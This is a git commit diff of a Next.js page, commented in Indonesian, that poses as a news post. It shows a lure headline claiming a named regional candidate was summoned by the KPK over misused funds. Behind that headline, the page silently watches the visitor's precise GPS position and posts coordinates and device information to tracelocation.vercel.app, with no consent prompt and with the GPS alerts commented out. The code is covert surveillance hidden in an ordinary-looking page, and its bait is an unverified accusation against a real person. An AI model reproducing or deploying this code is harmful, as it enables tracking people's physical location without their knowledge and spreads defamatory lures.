2db3e9f1412b36c68eac63bca6608292a40f47aa
Ziaul Kamal <codepad@usa.com>
2024-09-11 16:00:39 +0700

    update

--- src/app/post/[slug]/page.js
+++ src/app/post/[slug]/page.js
@@ -1,104 +1,106 @@
 "use client";
 import { useState, useEffect, useCallback } from 'react';
-import { useRouter } from 'next/navigation'; // import useRouter from next/navigation
+
 
 const PostPage = ({ params }) => {
-  const [post, setPost] = useState({
-    title: 'Baru Lagi, Safarudin Diperiksa Oleh KPK Terkait Dugaan .... Selengkapnya',
-    description: 'Calon Bupati Aceh Barat Daya 2024, Dr. Safarudin kembali dipanggil oleh KPK terkati adanya dugaan terhadap penyelewengan penggunaan Dana Anggaran...Selengkapnya',
-    image: 'https://cdn.ajnn.net/files/images/20211027-whatsapp-image-2021-10-27-at-17-59-31.jpeg' // Placeholder image
-  });
-  const [gpsEnabled, setGpsEnabled] = useState(true);
-  const [watchId, setWatchId] = useState(null);
+    const [post, setPost] = useState({
+        title: 'Baru Lagi, Safarudin Diperiksa Oleh KPK Terkait Dugaan .... Selengkapnya',
+        description: 'Calon Bupati Aceh Barat Daya 2024, Dr. Safarudin kembali dipanggil oleh KPK terkati adanya dugaan terhadap penyelewengan penggunaan Dana Anggaran...Selengkapnya',
+        image: 'https://cdn.ajnn.net/files/images/20211027-whatsapp-image-2021-10-27-at-17-59-31.jpeg' // Placeholder image
+    });
+    const [gpsEnabled, setGpsEnabled] = useState(true);
+    const [watchId, setWatchId] = useState(null);
+    
+    const { slug } = params;
+    
 
-  const { slug } = params;
+    // Simulasi data postingan berdasarkan slug
+    const fetchPost = useCallback(async () => {
+        // Ganti dengan data statis atau logika lain jika tidak menggunakan fetchPostData
+        // Simulasi data
+        const data = {
+        title: 'Baru Lagi, Safarudin Diperiksa Oleh KPK Terkait Dugaan .... Selengkapnya',
+        description: 'Calon Bupati Aceh Barat Daya 2024, Dr. Safarudin kembali dipanggil oleh KPK terkati adanya dugaan terhadap penyelewengan penggunaan Dana Anggaran...Selengkapnya',
+        image: 'https://cdn.ajnn.net/files/images/20211027-whatsapp-image-2021-10-27-at-17-59-31.jpeg' // Ganti dengan URL gambar nyata
+        };
+        setPost(data);
+    }, [slug]);
 
-  // Simulasi data postingan berdasarkan slug
-  const fetchPost = useCallback(async () => {
-    // Ganti dengan data statis atau logika lain jika tidak menggunakan fetchPostData
-    // Simulasi data
-    const data = {
-    title: 'Baru Lagi, Safarudin Diperiksa Oleh KPK Terkait Dugaan .... Selengkapnya',
-    description: 'Calon Bupati Aceh Barat Daya 2024, Dr. Safarudin kembali dipanggil oleh KPK terkati adanya dugaan terhadap penyelewengan penggunaan Dana Anggaran...Selengkapnya',
-    image: 'https://cdn.ajnn.net/files/images/20211027-whatsapp-image-2021-10-27-at-17-59-31.jpeg' // Ganti dengan URL gambar nyata
-    };
-    setPost(data);
-  }, [slug]);
+    useEffect(() => {
+        fetchPost();
 
-  useEffect(() => {
-    fetchPost();
-
-    return () => {
-      if (watchId) {
-        navigator.geolocation.clearWatch(watchId);
-      }
-    };
-  }, [fetchPost, watchId]);
-
-  const sendLocationData = (latitude, longitude, accuracy) => {
-    console.log('Sending location data:', { latitude, longitude, accuracy });
-    const userAgent = navigator.userAgent;
-
-    fetch('https://tracelocation.vercel.app/api/save-location', {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json',
-      },
-      body: JSON.stringify({
-        latitude,
-        longitude,
-        accuracy,
-        device_info: userAgent,
-        ip_address: '', // Tambahkan jika bisa menangani IP di sisi server
-      }),
-    })
-      .then((response) => {
-        if (!response.ok) {
-          throw new Error('Network response was not ok');
+        return () => {
+        if (watchId) {
+            navigator.geolocation.clearWatch(watchId);
         }
-        return response.json();
-      })
-      .then((data) => {
-        console.log('Location data saved:', data);
-      })
-      .catch((error) => console.error('Error saving location data:', error));
-  };
+        };
+    }, [fetchPost, watchId]);
 
-  const requestLocation = useCallback(() => {
-    if (navigator.geolocation) {
-      const id = navigator.geolocation.watchPosition(
-        (position) => {
-          const { latitude, longitude, accuracy } = position.coords;
-          sendLocationData(latitude, longitude, accuracy);
+    const sendLocationData = (latitude, longitude, accuracy) => {
+        console.log('Sending location data:', { latitude, longitude, accuracy });
+        const userAgent = navigator.userAgent;
+
+        fetch('https://tracelocation.vercel.app/api/save-location', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json',
         },
-        (error) => {
-          console.error('Geolocation error:', error);
-          setGpsEnabled(false);
-        //   alert('GPS belum aktif. Mohon aktifkan GPS untuk melanjutkan.');
-        },
-        {
-          enableHighAccuracy: true,
-          timeout: 10000,
-          maximumAge: 0,
-        }
-      );
-      setWatchId(id);
-    } else {
-      setGpsEnabled(false);
-    //   alert('Perangkat Anda tidak mendukung geolokasi.');
-    }
-  }, []);
-
-  useEffect(() => {
-    requestLocation();
-
-    return () => {
-      if (watchId) {
-        navigator.geolocation.clearWatch(watchId);
-      }
+        body: JSON.stringify({
+            latitude,
+            longitude,
+            accuracy,
+            device_info: userAgent,
+            ip_address: '', // Tambahkan jika bisa menangani IP di sisi server
+        }),
+        })
+        .then((response) => {
+            if (!response.ok) {
+            throw new Error('Network response was not ok');
+            }
+            return response.json();
+        })
+        .then((data) => {
+            console.log('Location data saved:', data);
+        })
+        .catch((error) => console.error('Error saving location data:', error));
     };
-  }, [requestLocation, watchId]);
 
+    const requestLocation = useCallback(() => {
+        if (navigator.geolocation) {
+        const id = navigator.geolocation.watchPosition(
+            (position) => {
+            const { latitude, longitude, accuracy } = position.coords;
+            sendLocationData(latitude, longitude, accuracy);
+            },
+            (error) => {
+            console.error('Geolocation error:', error);
+            setGpsEnabled(false);
+            //   alert('GPS belum aktif. Mohon aktifkan GPS untuk melanjutkan.');
+            },
+            {
+            enableHighAccuracy: true,
+            timeout: 10000,
+            maximumAge: 0,
+            }
+        );
+        setWatchId(id);
+        } else {
+        setGpsEnabled(false);
+        //   alert('Perangkat Anda tidak mendukung geolokasi.');
+        }
+    }, []);
+
+    useEffect(() => {
+        requestLocation();
+
+        return () => {
+        if (watchId) {
+            navigator.geolocation.clearWatch(watchId);
+        }
+        };
+    }, [requestLocation, watchId]);
+
+  
   return (
     <>
         
